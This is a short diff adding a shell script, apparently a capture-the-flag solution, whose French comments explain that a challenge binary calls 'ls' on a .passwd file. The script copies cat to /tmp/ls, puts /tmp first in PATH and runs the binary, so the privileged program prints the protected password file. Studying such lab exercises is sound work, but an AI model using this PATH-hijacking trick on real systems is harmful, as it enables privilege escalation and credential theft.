@@ -1,0 +1,8 @@
+#Le binaire execute  la commande "ls /challenge/app-script/ch11/.passwd".
+#Il nous suffit de remplacer l'appel a ls par un appel a cat.
+
+
+cat /bin/cat > /tmp/ls
+export PATH=/tmp:$PATH
+./ch11
+
